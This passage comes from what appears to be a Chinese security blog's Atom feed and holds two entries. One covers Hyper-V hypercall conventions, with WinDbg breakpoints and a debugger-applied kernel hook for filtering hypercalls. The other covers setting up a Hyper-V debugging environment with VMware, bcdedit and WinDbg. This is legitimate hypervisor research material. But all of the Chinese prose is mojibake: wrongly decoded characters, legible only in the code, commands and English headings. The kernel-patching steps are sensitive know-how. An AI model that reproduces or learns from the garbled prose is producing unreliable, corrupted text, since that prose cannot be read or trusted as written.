å¯„å­˜å™¨å¯ä»¥ç”¨äºä¼ é€’è¾“å…¥å‚æ•°çš„ GPAï¼ˆGuest Physical Addressï¼‰ï¼Œ<code>R8</code> å¯„å­˜å™¨å¯ä»¥ç”¨äºä¼ é€’è¾“å‡ºå‚æ•°çš„ GPAã€‚</p><p>å¦‚æœ Fast çš„å€¼ä¸º 1ï¼Œé‚£ä¹ˆ <code>RDX</code> å’Œ <code>R8</code> å¯„å­˜å™¨å¯ä»¥ç”¨äºä¼ é€’è¾“å…¥å‚æ•°ã€‚</p><p>å¦‚æœ Hypervisor æ”¯æŒ Extended Fast Hypercallsï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨ XMM å¯„å­˜å™¨æ¥ä¼ é€’è¾“å…¥å‚æ•°ï¼Œæœ€å¤šæ”¯æŒ <code>112</code> å­—èŠ‚çš„æ•°æ®ï¼šXMM0 ~ XMM5 å…± <code>16 * 6 = 96</code> å­—èŠ‚ï¼Œä»¥åŠ <code>RDX</code> å’Œ <code>R8</code> å…± <code>16</code> å­—èŠ‚ã€‚</p><h3 id="1-5-Hypercall-Outputs"><a href="#1-5-Hypercall-Outputs" class="headerlink" title="1.5 Hypercall Outputs"></a>1.5 Hypercall Outputs</h3><p>Hypercall çš„è¿”å›å€¼é€šè¿‡ <code>RAX</code> å¯„å­˜å™¨ä¼ é€’ï¼Œå¯¹åº”çš„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hypercall-output-rax.png" alt="Hyper-v Hypercall RAX å‚æ•°æ ¼å¼"></p><p>å¯¹åº”çš„è¯´æ˜å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å­—æ®µ</th><th>å®½åº¦</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>Result</td><td>16 bits</td><td>HV_STATUS code</td></tr><tr><td>Rsvd</td><td>16 bits</td><td>ä¿ç•™å­—æ®µ</td></tr><tr><td>Reps completed</td><td>12 bits</td><td>å·²ç»æˆåŠŸæ‰§è¡Œçš„ Repeat æ•°</td></tr><tr><td>Rsvd</td><td>20 bits</td><td>ä¿ç•™å­—æ®µ</td></tr></tbody></table><p>æ³¨æ„è¿™é‡Œçš„ <code>Reps completed</code> æ˜¯é’ˆå¯¹æ•´ä¸ª Repeat Hypercall è€Œè¨€çš„ï¼Œå³æ•´ä¸ª Repeat Hypercall å·²ç»æˆåŠŸæ‰§è¡Œçš„ Repeat æ•°ã€‚</p><p>åŒæ ·ï¼Œè¾“å‡ºå‚æ•°ä¹Ÿæ”¯æŒä½¿ç”¨ XMM å¯„å­˜å™¨ä¼ é€’ã€‚</p><h2 id="0x02-Hypercall-è°ƒç”¨"><a href="#0x02-Hypercall-è°ƒç”¨" class="headerlink" title="0x02. Hypercall è°ƒç”¨"></a>0x02. Hypercall è°ƒç”¨</h2><p>Windows å†…æ ¸æ¨¡å—å¯¼å‡ºäº†ä¸€ä¸ªå‡½æ•° <code>HvlInvokeHypercall</code> å¯ä»¥ç”¨äºå‘èµ· Hypercallï¼Œè¯¥å‡½æ•°æ˜¯å¯¹ <code>vmcall</code> / <code>vmmcall</code> æŒ‡ä»¤çš„ä¸€ä¸ªåŒ…è£…ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`3f330000 0f01d9          vmmcall</span><br><span class="line">fffff804`3f330003 c3              ret</span><br><span class="line"></span><br><span class="line">1: kd&gt; u nt!HvcallInitiateHypercall</span><br><span class="line">nt!HvcallInitiateHypercall:</span><br><span class="line">fffff804`40945080 4883ec28        sub     rsp,28h</span><br><span class="line">fffff804`40945084 488b059de22200  mov     rax,qword ptr [nt!HvcallCodeVa]</span><br><span class="line">fffff804`4094508b e850f20000      call    nt!_guard_retpoline_indirect_rax</span><br><span class="line">fffff804`40945090 4883c428        add     rsp,28h</span><br><span class="line">fffff804`40945094 c3              ret</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œå‡½æ•°çš„è°ƒå¼ç¬¦å·ä¸º <code>HvcallInitiateHypercall</code> ï¼Œåªä¸è¿‡æ˜¯ä»¥ <code>HvlInvokeHypercall</code> çš„åä¹‰å¯¼å‡ºçš„ã€‚</p><h2 id="0x03-Hypercall-ç›‘æ§"><a href="#0x03-Hypercall-ç›‘æ§" class="headerlink" title="0x03. Hypercall ç›‘æ§"></a>0x03. Hypercall ç›‘æ§</h2><p>åœ¨ WinDbg ä¸­ï¼Œå¯ä»¥é€šè¿‡å¯¹ <code>poi(nt!HvcallCodeVa)</code> ä¸‹ç¡¬ä»¶æ‰§è¡Œæ–­ç‚¹æ¥ç›‘æ§ Hypercall çš„è°ƒç”¨ï¼Œæ‹†åˆ†åçš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line"></span><br><span class="line">.printf &quot;           Hypercall: 0x%X\n&quot;, rcx &amp; 0xFFFF</span><br><span class="line">.printf &quot;                Fast: 0x%X\n&quot;, (rcx &gt;&gt; 16) &amp; 1</span><br><span class="line">.printf &quot;Variable header size: 0x%X\n&quot;, (rcx &gt;&gt; 17) &amp; 0x1FF</span><br><span class="line">.printf &quot;           Is Nested: 0x%X\n&quot;, (rcx &gt;&gt; 26) &amp; 1</span><br><span class="line">.printf &quot;           Rep Count: 0x%X\n&quot;, (rcx &gt;&gt; 32) &amp; 0xFFF</span><br><span class="line">.printf &quot;     Rep Start Index: 0x%X\n&quot;, (rcx &gt;&gt; 48) &amp; 0xFFF</span><br><span class="line">k</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p>WinDbg ä»…æ”¯æŒå•è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥å®é™…æµ‹è¯•æ—¶éœ€è¦æŠŠæ–­ç‚¹ä¹‹åçš„å‘½ä»¤å†™æˆä¸€è¡Œã€ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥å¹¶ä¸”åŸæœ‰å‘½ä»¤ä¸­çš„ç‰¹æ®Šå­—ç¬¦éœ€è¦è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚</p><p>ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•è¿›è¡Œç›‘æ§ï¼ŒWinDbg ä¼šè¾“å‡ºå¤§é‡çš„æ—¥å¿—ï¼Œè¿™å…¶ä¸­ä¸ä¹ä¸€äº›å¥‡æ€ªçš„æ—¥å¿—ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">           Hypercall: 0xB</span><br><span class="line">                Fast: 0x0</span><br><span class="line">Variable header size: 0x0</span><br><span class="line">           Is Nested: 0x0</span><br><span class="line">           Rep Count: 0x0</span><br><span class="line">     Rep Start Index: 0x100</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 fffffd89`ba061828 fffff800`37c89f7c 0xfffff800`35e10000</span><br><span class="line">01 fffffd89`ba061830 fffff800`384b9752 nt!HvlSendSyntheticClusterIpi+0x7c</span><br><span class="line">02 fffffd89`ba061860 fffff800`37abaecb hal!HalRequestIpi+0x532</span><br><span class="line">03 fffffd89`ba061b00 fffff800`37bc5e84 nt!PoIdle+0x45b</span><br><span class="line">04 fffffd89`ba061c60 00000000`00000000 nt!KiIdleLoop+0x44</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼ŒæŒ‰ç…§å¾®è½¯å®˜æ–¹æ–‡æ¡£çš„ç†è§£ï¼Œè¿™é‡Œ <code>Rep Count</code> ä¸º <code>0</code> ï¼Œæ‰€ä»¥ç¼–å·ä¸º <code>0xB</code> çš„ Hypercall åº”è¯¥æ˜¯ä¸€ä¸ª Simple Hypercallï¼Œè€Œ Simple Hypercall çš„ <code>Rep Start Index</code> ä¹Ÿåº”è¯¥æ˜¯ <code>0</code> ï¼Œä½†è¿™é‡Œå´ä¸º <code>0x100</code> ã€‚</p><p>å½“ç„¶ï¼Œè¿™ç§æ–¹æ³•æœ€ä¸»è¦çš„é—®é¢˜æ˜¯æ²¡æœ‰å¯¹ Hypercall è¿›è¡Œè¿‡æ»¤ï¼Œè¿™å°±ä¼šå¯¼è‡´ WinDbg éœ€è¦é¢‘ç¹åœ°å¤„ç†æ–­ç‚¹ï¼Œæ—¢è€—è´¹èµ„æºï¼Œæ“ä½œä¹Ÿä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚é‚£ä¹ˆåœ¨ WinDbg çš„æ¡ä»¶æ–­ç‚¹ä¸­å†åŠ ä¸€ä¸ªè¿‡æ»¤æ¡ä»¶å¯ä¸å¯ä»¥å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ï¼ä½†æ˜¯åœ¨ WinDbg è¿›è¡Œè¿‡æ»¤çš„æ—¶å€™ï¼Œå…¶å®æ–­ç‚¹å·²ç»å‘½ä¸­å¹¶ä¸”ç”± WinDbg æ¥ç®¡äº†ï¼Œæ‰€ä»¥ååº”é€Ÿåº¦è¿˜æ˜¯å¾ˆæ…¢ã€‚</p><p>Jaanus KaÌˆaÌˆp é€šè¿‡åœ¨ WinDbg ä¸­å¯¹å†…æ ¸æ¨¡å—è¿›è¡Œ Patchï¼Œå³å¯¹åœ°å€ <code>poi(nt!HvcallCodeVa)</code> è¿›è¡Œ HOOKï¼Œç›´æ¥è¿‡æ»¤æ‰ä¸æ„Ÿå…´è¶£çš„ Hypercallï¼Œè¿™æ · WinDbg çš„ååº”é€Ÿåº¦å°±ä¼šå¿«å¾ˆå¤šã€‚å…·ä½“çš„æ“ä½œæ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li>å†™ä¸€æ®µæ±‡ç¼–æŒ‡ä»¤è¿‡æ»¤æ‰ Fast ç±»å‹çš„ Hypercall</li><li>å°†æ±‡ç¼–æŒ‡ä»¤ç¼–è¯‘æˆæœºå™¨ç </li><li>åœ¨å†…æ ¸æ¨¡å—çš„ <code>.text</code> æœ«å°¾æ‰¾åˆ°ä¸€å—å¯æ‰§è¡Œçš„ç©ºç™½åŒºé—´ç”¨äºå­˜æ”¾æœºå™¨ç </li><li>ä¿®å¤ HOOK çš„è·³è½¬<ul><li>æŠŠ <code>nt!HvcallCodeVa</code> å¤„çš„å€¼ä¿®æ”¹ä¸ºä¸Šè¿°æœºå™¨ç çš„èµ·å§‹åœ°å€</li><li>è¿‡æ»¤ä»£ç æ‰§è¡Œå®Œæ¯•åè·³è½¬å› <code>poi(nt!HvcallCodeVa)</code> æ‰§è¡Œä»£ç </li></ul></li></ol><p>è¿‡æ»¤ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        test    rcx, 0x10000</span><br><span class="line">        jnz     skip</span><br><span class="line">        int     3</span><br><span class="line">skip:</span><br><span class="line">        mov     rax, 0xfffff8014dfc0000</span><br><span class="line">        jmp     rax</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚æœé‡åˆ°é Fast Hypercall åˆ™é€šè¿‡ <code>int 3</code> ä¸­æ–­ï¼Œä¼šè‡ªåŠ¨æ¿€æ´» WinDbgï¼›ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œä¸‹æ¡ä»¶æ–­ç‚¹è¿›è¡Œè‡ªåŠ¨ç›‘æ§ã€‚</p><h2 id="0x04-å‚è€ƒæ–‡æ¡£"><a href="#0x04-å‚è€ƒæ–‡æ¡£" class="headerlink" title="0x04. å‚è€ƒæ–‡æ¡£"></a>0x04. å‚è€ƒæ–‡æ¡£</h2><ol><li>Jaanus KaÌˆaÌˆp åšå®¢ <a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x1-hypercalls-part-1.html" target="_blank" rel="noopener">Hyper-V #0x1 - Hypercalls part 1</a></li><li>å¾®è½¯å®˜æ–¹æ–‡æ¡£ <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/tlfs" target="_blank" rel="noopener">Hypervisor Top-Level Functional Specification</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hyper-V Hypercall ç›¸å…³åŸºç¡€çŸ¥è¯†ä»‹ç»ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
      <category term="Hypercall" scheme="https://programlife.net/tags/Hypercall/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V è°ƒè¯•ç¯å¢ƒæ­å»º</title>
    <link href="https://programlife.net/2020/05/16/hyper-v-debugging/"/>
    <id>https://programlife.net/2020/05/16/hyper-v-debugging/</id>
    <published>2020-05-16T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä½¿ç”¨ AMD CPU çš„ç”µè„‘å¦‚ä½•åˆ©ç”¨ VMware Workstation æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒã€‚</p><a id="more"></a><p>ä¸Šä¸€ç¯‡æ–‡ç« ã€Š<a href="https://programlife.net/2020/05/11/hyper-v-on-windows-10-notes/">Hyper-V on Windows 10 Notes</a>ã€‹æåˆ°äº† Hyper-V æš‚æ—¶ä¸æ”¯æŒ AMD CPU çš„åµŒå¥—è™šæ‹ŸåŒ–ï¼Œæ‰€ä»¥å°±æ— æ³•ä½¿ç”¨æ–‡ç« ã€Š<a href="https://msrc-blog.microsoft.com/2018/12/10/first-steps-in-hyper-v-research/" target="_blank" rel="noopener">First Steps in Hyper-V Research</a>ã€‹ä¸­ä»‹ç»çš„ Hyper-V åµŒå¥—è™šæ‹ŸåŒ–æ¥æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒï¼Œæœ¬æ–‡å‚è€ƒæ–‡ç« ã€Š<a href="https://foxhex0ne.blogspot.com/2020/05/hyper-v-0x0-research-setup.html" target="_blank" rel="noopener">Hyper-V #0x0 - Research setup</a>ã€‹ä¸­ä»‹ç»çš„æ–¹æ³•åˆ©ç”¨ VMware Workstation æ¥æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒã€‚</p><h2 id="0x01-ç‰©ç†æœºè®¾ç½®"><a href="#0x01-ç‰©ç†æœºè®¾ç½®" class="headerlink" title="0x01. ç‰©ç†æœºè®¾ç½®"></a>0x01. ç‰©ç†æœºè®¾ç½®</h2><p>ç‰©ç†æœºä¸éœ€è¦å®‰è£… Hyper-V ç»„ä»¶ï¼Œå¦åˆ™ VMware Workstation å°†æ— æ³•è¿è¡Œï¼›å¦‚æœç‰©ç†æœºå®‰è£…äº† Hyper-Vï¼Œå¯ä»¥å‚è€ƒæ–‡ç« ã€Š<a href="https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/">VMware Workstation Incompatible with Device/Credential Guard</a>ã€‹ä¸´æ—¶ç¦ç”¨ Hyper-Vã€‚</p><h2 id="0x02-è™šæ‹Ÿæœºè®¾ç½®"><a href="#0x02-è™šæ‹Ÿæœºè®¾ç½®" class="headerlink" title="0x02. è™šæ‹Ÿæœºè®¾ç½®"></a>0x02. è™šæ‹Ÿæœºè®¾ç½®</h2><p>ç‰©ç†æœºå®‰è£…å¥½ VMware Workstation ä¹‹åï¼Œå¯ä»¥æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºå¹¶å®‰è£…å¥½æœ€æ–°çš„ 64 ä½ Windows 10 æ“ä½œç³»ç»Ÿã€‚</p><h3 id="2-1-è™šæ‹Ÿæœº-CPU-è®¾ç½®"><a href="#2-1-è™šæ‹Ÿæœº-CPU-è®¾ç½®" class="headerlink" title="2.1 è™šæ‹Ÿæœº CPU è®¾ç½®"></a>2.1 è™šæ‹Ÿæœº CPU è®¾ç½®</h3><p>è¿™é‡Œéœ€è¦åœ¨ VMware Workstation ä¸­ä¸ºè™šæ‹Ÿæœºçš„ CPU å¼€å¯è™šæ‹ŸåŒ–å¼•æ“ï¼š</p><ul><li>è™šæ‹ŸåŒ– Intel VT-x/EPT æˆ– AMD-V/RVI(V)</li><li>è™šæ‹ŸåŒ– CPU æ€§èƒ½è®¡æ•°å™¨(U)</li></ul><p><img src="/uploads/202005/vmware-hyperv-cpu-settings.png" alt="CPU è™šæ‹ŸåŒ–å¼•æ“è®¾ç½®"></p><p>åŒæ—¶ï¼Œéœ€è¦ä¸ºè™šæ‹Ÿæœºå¢åŠ ä¸€ä¸ªä¸²å£ç”¨äº Windows å†…æ ¸è°ƒè¯•ï¼ˆè™šæ‹Ÿæœºé»˜è®¤æœ‰ä¸€ä¸ªæ‰“å°æœºï¼Œéœ€è¦å…ˆæŠŠæ‰“å°æœºåˆ æ‰ï¼‰ï¼š</p><ul><li>ä½¿ç”¨å‘½åç®¡é“ <code>\\.\pipe\com_1</code> </li><li>è¯¥ç«¯æ˜¯æœåŠ¡å™¨</li><li>å¦ä¸€ç«¯æ˜¯è™šæ‹Ÿæœº</li></ul><p><img src="/uploads/202005/vmware-kernel-debug-serial-port.png" alt="è™šæ‹Ÿæœºä¸²å£è®¾ç½®"></p><h3 id="2-2-è™šæ‹Ÿæœº-Hyper-V-è®¾ç½®"><a href="#2-2-è™šæ‹Ÿæœº-Hyper-V-è®¾ç½®" class="headerlink" title="2.2 è™šæ‹Ÿæœº Hyper-V è®¾ç½®"></a>2.2 è™šæ‹Ÿæœº Hyper-V è®¾ç½®</h3><p>è¿™é‡Œéœ€è¦åœ¨å®‰è£…å¥½çš„è™šæ‹Ÿæœºä¸­å®‰è£…å¹¶å¯ç”¨ Hyper-V ç»„ä»¶ï¼ŒåŒæ—¶é€šè¿‡ <code>bcdedit</code> è®¾ç½®ç›¸å…³çš„è°ƒè¯•é€‰é¡¹ã€‚</p><ul><li>å†…æ ¸è°ƒè¯•è®¾ç½®ï¼ˆé€šè¿‡ä¸²å£è¿›è¡Œè°ƒè¯•ï¼‰</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bcdedit /dbgsettings serial debugport:<span class="number">1</span> baudrate:<span class="number">115200</span></span><br><span class="line">bcdedit /debug on</span><br></pre></td></tr></table></figure><ul><li>Hyper-V è°ƒè¯•è®¾ç½®ï¼ˆé€šè¿‡ç½‘ç»œè¿›è¡Œè°ƒè¯•ï¼‰</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bcdedit /hypervisorsettings NET HOSTIP:<span class="number">192.168</span>.<span class="number">6.1</span> PORT:<span class="number">50000</span></span><br><span class="line">bcdedit /set hypervisordebug on</span><br><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„ IP åœ°å€æ˜¯ç‰©ç†æœºä¸­ç½‘å¡ <code>VMware Network Adapter VMnet8</code> çš„ IP åœ°å€ï¼Œç«¯å£è®¾ç½®ä¸º <code>50000</code> ã€‚è¿™æ¡å‘½ä»¤æ‰§è¡Œå®Œæ¯•ä¹‹åäº§ç”Ÿçš„ä¸€ä¸ª Key éœ€è¦è®°ä¸‹æ¥ï¼Œåé¢ WinDbg è®¾ç½®å°†ä¼šç”¨åˆ°ã€‚</p><p><img src="/uploads/202005/hyperv-bcdedit-debug-settings.png" alt="è™šæ‹Ÿæœº Hyper-V è®¾ç½®"></p><h2 id="0x03-WinDbg-è®¾ç½®"><a href="#0x03-WinDbg-è®¾ç½®" class="headerlink" title="0x03. WinDbg è®¾ç½®"></a>0x03. WinDbg è®¾ç½®</h2><p>å¤åˆ¶ä¸¤ä¸ª 64 ä½ WinDbg çš„å¿«æ·æ–¹å¼ï¼Œå…¶ä¸­ä¸€ä¸ªé™„åŠ å¦‚ä¸‹å‚æ•°ç”¨äºè°ƒè¯• Windows å†…æ ¸ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-k com:port=\\.\pipe\com_1,baud=115200,pipe,reconnect</span><br></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªé™„åŠ å¦‚ä¸‹å‚æ•°ç”¨äºè°ƒè¯• Hyper-Vï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-k net:port=50000,key=å‰é¢ç”Ÿæˆçš„Keyå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><h2 id="0x04-Hyper-V-è°ƒè¯•"><a href="#0x04-Hyper-V-è°ƒè¯•" class="headerlink" title="0x04. Hyper-V è°ƒè¯•"></a>0x04. Hyper-V è°ƒè¯•</h2><p>ä¸€åˆ‡å‡†å¤‡å°±ç»ªä¹‹åï¼Œå…ˆæ‰“å¼€ä¸¤ä¸ª WinDbgï¼Œç„¶åå¼€å¯è™šæ‹Ÿæœºï¼Œå°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ã€‚</p><p>åœ¨è°ƒè¯• Hyper-V çš„ WinDbg ä¸­ï¼Œå¯ä»¥æŸ¥çœ‹ <code>hv</code> æ¨¡å—çš„ç›¸å…³ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; lmvm hv</span><br><span class="line">Browse full module list</span><br><span class="line">start             end                 module name</span><br><span class="line">fffffb6a`57000000 fffffb6a`58800000   hv         (no symbols)</span><br><span class="line">    Loaded symbol image file: hvax64.exe</span><br><span class="line">    Image path: hvax64.exe</span><br><span class="line">    Image name: hvax64.exe</span><br><span class="line">    Browse all global symbols  functions  data</span><br><span class="line">    Image was built with /Brepro flag.</span><br><span class="line">    Timestamp:        DBBF3B47</span><br><span class="line">    CheckSum:         00110BD8</span><br><span class="line">    ImageSize:        01800000</span><br><span class="line">    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4</span><br><span class="line">    Information from resource tables:</span><br><span class="line"></span><br><span class="line">0: kd&gt; ?hv</span><br><span class="line">Evaluate expression: -5040831987712 = fffffb6a`57000000</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œç‰©ç†æœºä½¿ç”¨çš„æ˜¯ AMD çš„ CPUï¼Œæ‰€ä»¥ <code>hv</code> æ¨¡å—å®é™…ä¸Šæ˜¯ <code>hvax64.exe</code> ï¼›å¦‚æœæ˜¯ Intel çš„ CPUï¼Œé‚£ä¹ˆä¼šæ˜¯ <code>hvix64.exe</code> ã€‚</p><p>åœ¨è°ƒè¯• Windows å†…æ ¸çš„ WinDbg ä¸­ï¼Œå¯ä»¥æŸ¥çœ‹ <code>hypercall</code> å¯¹åº”çš„æŒ‡ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; u poi(nt!HvcallCodeVa)</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0003 c3              ret</span><br><span class="line">fffff804`4cbe0004 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe0006 b811000000      mov     eax,11h</span><br><span class="line">fffff804`4cbe000b 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe000e c3              ret</span><br><span class="line">fffff804`4cbe000f 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe0012 48c7c111000000  mov     rcx,11h</span><br><span class="line">fffff804`4cbe0019 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe001c c3              ret</span><br><span class="line">fffff804`4cbe001d 8bc8            mov     ecx,eax</span><br><span class="line">fffff804`4cbe001f b812000000      mov     eax,12h</span><br><span class="line">fffff804`4cbe0024 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0027 c3              ret</span><br><span class="line">fffff804`4cbe0028 488bc1          mov     rax,rcx</span><br><span class="line">fffff804`4cbe002b 48c7c112000000  mov     rcx,12h</span><br><span class="line">fffff804`4cbe0032 0f01d9          vmmcall</span><br><span class="line">fffff804`4cbe0035 c3              ret</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œç‰©ç†æœºä½¿ç”¨çš„æ˜¯ AMD çš„ CPUï¼Œæ‰€ä»¥ <code>hypercall</code> å¯¹åº”çš„æŒ‡ä»¤ä¸º <code>vmmcall</code> ï¼›å¦‚æœæ˜¯ Intel çš„ CPUï¼Œé‚£ä¹ˆ <code>hypercall</code> å¯¹åº”çš„æŒ‡ä»¤ä¸º <code>vmcall</code> ã€‚</p><p>å¯¹ <code>vmmcall</code> æ‰€åœ¨çš„ä½ç½®ä¸‹æ–­ç‚¹ï¼Œéœ€è¦ä½¿ç”¨ç¡¬ä»¶æ‰§è¡Œæ–­ç‚¹ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; ba e1 poi(nt!HvcallCodeVa)</span><br><span class="line">3: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">fffff804`4cbe0000 0f01d9          vmmcall</span><br><span class="line"></span><br><span class="line">1: kd&gt; k</span><br><span class="line"> # Child-SP          RetAddr           Call Site</span><br><span class="line">00 ffffbe0b`d64532c8 fffff804`4d9cc124 0xfffff804`4cbe0000</span><br><span class="line">01 ffffbe0b`d64532d0 fffff804`4da8e91c nt!HvcallpExtendedFastHypercall+0x54</span><br><span class="line">02 ffffbe0b`d64532e0 fffff804`4da8eb10 nt!HvlpFastFlushListTb+0xac</span><br><span class="line">03 ffffbe0b`d64533a0 fffff804`4da8e5f3 nt!HvlpFlushRangeListTb+0x88</span><br><span class="line">04 ffffbe0b`d6453400 fffff804`4da52642 nt!HvlFlushRangeListTb+0x63</span><br><span class="line">05 ffffbe0b`d6453450 fffff804`4d8f3e71 nt!MiFlushTbList+0x167fe2</span><br><span class="line">06 ffffbe0b`d64535a0 fffff804`4d8f5305 nt!MiCopyOnWrite+0x761</span><br><span class="line">07 ffffbe0b`d6453840 fffff804`4d8c986f nt!MiValidFault+0x295</span><br><span class="line">08 ffffbe0b`d64538b0 fffff804`4d8c8fae nt!MiUserFault+0x3cf</span><br><span class="line">09 ffffbe0b`d6453960 fffff804`4d9d041e nt!MmAccessFault+0x14e</span><br><span class="line">0a ffffbe0b`d6453b00 00007ff8`107805d3 nt!KiPageFault+0x35e</span><br><span class="line">0b 0000002e`3b4fb030 00000003`22e0813e 0x00007ff8`107805d3</span><br><span class="line">0c 0000002e`3b4fb038 000001b8`adbe82f0 0x00000003`22e0813e</span><br><span class="line">0d 0000002e`3b4fb040 00000000`00000000 0x000001b8`adbe82f0</span><br></pre></td></tr></table></figure><p>å’Œç³»ç»Ÿè°ƒç”¨ä¸€æ ·ï¼Œä¸åŒçš„ <code>hypercall</code> å¯¹åº”ä¸åŒçš„ç¼–å·ï¼Œç¼–å·å¯ä»¥ç”¨äºå®šä½å¯¹åº”çš„ Handler å‡½æ•°ã€‚åœ¨åœ°å€ <code>hv+0xC00000</code> å¤„ï¼Œæ¯ä¸€ä¸ª <code>hypercall</code> æœ‰ä¸€ä¸ª <code>0x18</code> å­—èŠ‚çš„ç»“æ„ä½“ï¼Œå…¶ä¸­ç»“æ„ä½“æœ€å‰é¢çš„ <code>8</code> å­—èŠ‚ä¾¿æ˜¯å¯¹åº”çš„ Handler å‡½æ•°çš„èµ·å§‹åœ°å€ã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4: kd&gt; dq hv+0xC00000</span><br><span class="line">fffffb6a`57c00000  fffffb6a`572321e0 00000000`00000000</span><br><span class="line">fffffb6a`57c00010  00000041`00000000 fffffb6a`5729ae90</span><br><span class="line">fffffb6a`57c00020  00000008`00000001 00000044`00000000</span><br><span class="line">fffffb6a`57c00030  fffffb6a`5722dcc0 00000018`00000002</span><br><span class="line">fffffb6a`57c00040  00000044`00000000 fffffb6a`57215e40</span><br><span class="line">fffffb6a`57c00050  00080018`00010003 00000044`00000000</span><br><span class="line">fffffb6a`57c00060  fffffb6a`5729b230 00000008`00000004</span><br><span class="line">fffffb6a`57c00070  0000003f`00000020 fffffb6a`57244200</span><br><span class="line"></span><br><span class="line">4: kd&gt; u fffffb6a`572321e0</span><br><span class="line">hv+0x2321e0:</span><br><span class="line">fffffb6a`572321e0 b802000000      mov     eax,2</span><br><span class="line">fffffb6a`572321e5 c3              ret</span><br><span class="line">fffffb6a`572321e6 cc              int     3</span><br></pre></td></tr></table></figure><h2 id="0x05-è°ƒè¯•ç¬¦å·"><a href="#0x05-è°ƒè¯•ç¬¦å·" class="headerlink" title="0x05. è°ƒè¯•ç¬¦å·"></a>0x05. è°ƒè¯•ç¬¦å·</h2><p>å¾®è½¯å·²ç»é€æ­¥å¼€æ”¾äº† Hyper-V ç›¸å…³ç»„ä»¶çš„è°ƒè¯•ç¬¦å·ï¼Œä½†æ˜¯ <code>hv</code> æ¨¡å—ï¼ˆå³ <code>hvax64.exe / hvix64.exe</code> ï¼‰çš„è°ƒè¯•ç¬¦å·æš‚æ—¶ä¸å¯¹åƒç“œç¾¤ä¼—å¼€æ”¾ã€‚</p><p>å¾®è½¯è¿˜ä¸º WinDbg å¼€å‘äº†ä¸€ä¸ªè°ƒè¯• Hyper-V çš„æ’ä»¶ <code>hvexts.dll</code> ï¼Œä½†ç›®å‰ä¹Ÿæ²¡æœ‰å¯¹å¤–å¼€æ”¾ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä½¿ç”¨ AMD CPU çš„ç”µè„‘å¦‚ä½•åˆ©ç”¨ VMware Workstation æ­å»º Hyper-V çš„è°ƒè¯•ç¯å¢ƒã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
